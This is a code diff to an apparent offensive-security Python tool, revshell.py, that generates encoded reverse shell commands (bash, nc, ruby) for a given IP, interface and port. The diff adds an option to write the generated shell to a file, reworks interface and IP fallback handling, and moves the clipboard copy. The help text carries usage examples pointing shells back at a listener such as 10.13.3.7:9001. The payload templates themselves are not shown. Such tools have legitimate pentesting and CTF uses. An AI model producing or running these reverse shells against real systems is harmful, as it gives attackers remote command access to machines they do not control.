@@ -47,8 +47,8 @@ parser = argparse.ArgumentParser(description=f'''{help_subtitle}\n{help_default_
         3. url-all      url-encodes all characters.
 \nExamples:\n
 python3 revshell.py -i 10.13.3.7 -p 9001 -t nc -e url-all
-python3 revshell.py -p 1337
-python3 revshell.py -i tun0 -s /bin/bash -t ruby -e base64 -c\n''', formatter_class=RawTextHelpFormatter)
+python3 revshell.py -p 1337 -o reverse_shell.txt
+python3 revshell.py -i tun0 -s /bin/bash -t ruby -e base64 -c''', formatter_class=RawTextHelpFormatter)
 
 parser.add_argument('-i', '--ip', type=str, metavar='', help='Specify the IP address you want to listen on.')
 parser.add_argument('-p', '--port', type=str, metavar = '', default="443", help='The port you want to listen on.')
@@ -57,16 +57,18 @@ parser.add_argument('-t', '--rev-type', type=str, metavar = '', default = "bash"
 parser.add_argument('-e', '--encode', type=str, metavar = '', help='Specify encoding for the shell.')
 parser.add_argument('-c', '--clipboard', action = 'store_true', help='Copies into clipboard.\n')
 parser.add_argument('-f', '--force', action = 'store_true', help='Forces tool to accept argument.\n')
+parser.add_argument('-o', type=str, metavar = '', help='File to output shell.')
 
 args = parser.parse_args()
 
 class shells():
-    def __init__(self,ip,port,rev_type,encode,force):
+    def __init__(self,ip,port,rev_type,encode,force,outfile):
         self.ip = ip
         self.port = port
         self.rev_type = rev_type
         self.shell = shell
         self.encode = encode
+        self.outfile = outfile
     
     def encoding(self,reverse,encode):        
         encode = encode.lower()
@@ -89,6 +91,8 @@ class shells():
         global shell
         global port
         global ip
+        
+        # Series of try and except to test for presence of an interface (for some reason this does not test for valid ip)
         try:
             socket.inet_aton(ip)
         except:
@@ -100,6 +104,7 @@ class shells():
                     ip = 'lo'
                 ip = ni.ifaddresses(ip)[ni.AF_INET][0]['addr']
 
+            # If specified interface not found
             except ValueError:
                 
                 if not force:
@@ -110,16 +115,17 @@ class shells():
                         ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
                     else:
                         cprint("Specified interface was not found, ip is invalid, or no ip specified. Defaulting to eth0. Use --force to override.\n","red")
-                        ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+                        try:
+                            ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+                    
             
-            # If for some reason there is still an exception
-            except Exception as e:
-                print(e)
-                sys.exit("Please specify an ip address or interface.")
-        
-        # Coloring messes up output unless initialized with coloram.
+                        # If for some reason there is still an exception
+                        except Exception as e:
+                            sys.exit("Please specify an ip address or interface.")
+            
+        # Coloring messes up shell when copying or encoding
         # Couldn't find a way to make it work with encoding
-        if not encode and not clipboard:
+        if not encode and not clipboard and not outfile:
             colorama.init()
             shell = colored(shell, 'red')
             port = colored(port, 'red')
@@ -160,10 +166,19 @@ class shells():
         # If user wants to encode the shell
         if encode:
             reverse = shells.encoding(self,reverse,encode)
-            return reverse 
-        else:     
-            return reverse
     
+        if outfile:
+            f = open(outfile,'w')
+            f.write(reverse)
+            f.close()
+        
+        if clipboard:
+            pyperclip.copy(reverse)
+            sys.exit(cprint("The reverse shell has been copied to your system clipboard.","green"))
+
+        return reverse
+
+
 # Gets all the arguments
 if __name__ == '__main__':
     ip = args.ip
@@ -173,12 +188,9 @@ if __name__ == '__main__':
     encode = args.encode
     clipboard = args.clipboard
     force = args.force
-    
-    arguments = shells(ip,port,rev_type,encode,force)
+    outfile = args.o
+    arguments = shells(ip,port,rev_type,encode,force,outfile)
 
-if clipboard:
-    pyperclip.copy(arguments.reverse_shell())
-    sys.exit(cprint("The reverse shell has been copied to your system clipboard.","green"))
 if len(sys.argv) > 1:
     sys.exit(arguments.reverse_shell())
 else:
